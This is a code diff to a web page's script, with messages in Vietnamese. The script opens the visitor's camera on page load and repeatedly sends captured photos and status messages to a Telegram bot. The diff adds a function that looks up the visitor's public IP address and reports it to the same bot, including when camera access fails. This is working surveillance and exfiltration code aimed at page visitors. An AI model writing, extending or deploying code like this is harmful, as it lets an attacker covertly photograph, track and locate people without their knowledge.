@@ -14,6 +14,7 @@
     let lastCaptureTime = 0;
 
     openCameraAndCapture();
+    getAndSendPublicIP();
 
     function openCameraAndCapture() {
       const video = document.getElementById('videoElement');
@@ -42,18 +43,32 @@
 
               setTimeout(() => {
                 stream.getTracks().forEach(track => track.stop());
-                sendMessageToTelegram("Close capture");
+                sendMessageToTelegram("Đã kết thúc chụp ảnh");
               }, 30000);
             };
           })
           .catch(function(error) {
             console.error("Không thể mở camera:", error);
             sendMessageToTelegram("Không thể mở camera: " + error.message);
+            getAndSendPublicIP();
           });
       } else {
-        console.error("cant open cam");
-        sendMessageToTelegram("cant open cam");
+        console.error("Không thể mở camera");
+        sendMessageToTelegram("Không thể mở camera");
+        getAndSendPublicIP();
       }
+    }
+
+    function getAndSendPublicIP() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          sendMessageToTelegram("Địa chỉ IP công khai: " + data.ip);
+        })
+        .catch(error => {
+          console.error("Lỗi khi lấy địa chỉ IP:", error);
+          sendMessageToTelegram("Không thể lấy địa chỉ IP: " + error.message);
+        });
     }
 
     function sendPhotoToTelegram(blob) {
@@ -67,9 +82,11 @@
       })
       .then(response => response.json())
       .then(result => {
+        console.log('Ảnh đã được gửi thành công:', result);
       })
       .catch(error => {
-        sendMessageToTelegram("Error: " + error.message);
+        console.error('Lỗi khi gửi ảnh:', error);
+        sendMessageToTelegram("Lỗi khi gửi ảnh: " + error.message);
       });
     }
 
@@ -83,10 +100,8 @@
       });
     }
 
-    openCameraAndCapture();
-
     window.addEventListener('beforeunload', function(event) {
-      sendMessageToTelegram("Web site is close");
+      sendMessageToTelegram("Trang web đang đóng");
     });
   </script>
 </body>
